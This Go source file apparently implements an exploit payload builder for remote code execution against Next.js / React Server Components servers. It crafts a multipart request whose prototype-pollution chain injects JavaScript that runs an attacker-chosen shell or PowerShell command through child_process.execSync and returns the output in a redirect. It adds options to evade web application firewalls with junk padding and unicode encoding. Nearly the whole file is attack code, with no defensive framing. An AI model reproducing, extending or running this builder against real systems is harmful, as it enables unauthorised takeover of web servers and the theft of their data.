package payload

import (
	"encoding/json"
	"fmt"
	"strings"
)

type ExploitBuilder struct {
	command          string
	windows         bool
	wafBypass        bool
	wafBypassSizeKB  int
	unicodeEncode    bool
}

func NewExploitBuilder() *ExploitBuilder {
	return &ExploitBuilder{
		wafBypassSizeKB: 128,
	}
}

func (b *ExploitBuilder) SetCommand(cmd string) *ExploitBuilder {
	b.command = cmd
	return b
}

func (b *ExploitBuilder) SetWindows(windows bool) *ExploitBuilder {
	b.windows = windows
	return b
}

func (b *ExploitBuilder) SetWAFBypass(bypass bool, sizeKB int) *ExploitBuilder {
	b.wafBypass = bypass
	if sizeKB > 0 {
		b.wafBypassSizeKB = sizeKB
	}
	return b
}

func (b *ExploitBuilder) SetUnicodeEncode(encode bool) *ExploitBuilder {
	b.unicodeEncode = encode
	return b
}

func (b *ExploitBuilder) Build() Payload {
	escapedCmd := strings.ReplaceAll(b.command, "'", "\\'")

	var prefixPayload string
	if b.windows {
		prefixPayload = fmt.Sprintf(
			"var res=process.mainModule.require('child_process')"+
				".execSync('powershell -c \"%s\"',{timeout:30000})"+
				".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"+
				"{digest: `NEXT_REDIRECT;push;/exploit?out=${encodeURIComponent(res)};307;`});",
			escapedCmd,
		)
	} else {
		prefixPayload = fmt.Sprintf(
			"var res=process.mainModule.require('child_process')"+
				".execSync('%s',{timeout:30000})"+
				".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"+
				"{digest: `NEXT_REDIRECT;push;/exploit?out=${encodeURIComponent(res)};307;`});",
			escapedCmd,
		)
	}

	part0Data := map[string]interface{}{
		"then":   "$1:__proto__:then",
		"status": "resolved_model",
		"reason": -1,
		"value":  "{\"then\":\"$B1337\"}",
		"_response": map[string]interface{}{
			"_prefix":   prefixPayload,
			"_chunks":   "$Q2",
			"_formData": map[string]string{"get": "$1:constructor:constructor"},
		},
	}

	part0JSON, _ := json.Marshal(part0Data)
	part0 := string(part0JSON)

	if b.unicodeEncode {
		part0 = encodeUnicode(part0)
	}

	var parts []string

	if b.wafBypass {
		paramName, junk := generateJunkData(b.wafBypassSizeKB)
		parts = append(parts, fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"%s\"\r\n\r\n"+
				"%s\r\n",
			paramName, junk,
		))
	}

	parts = append(parts,
		fmt.Sprintf("------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"%s\r\n", part0),
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)

	return Payload{
		Body:        strings.Join(parts, ""),
		ContentType: "multipart/form-data; boundary=" + boundary,
	}
}

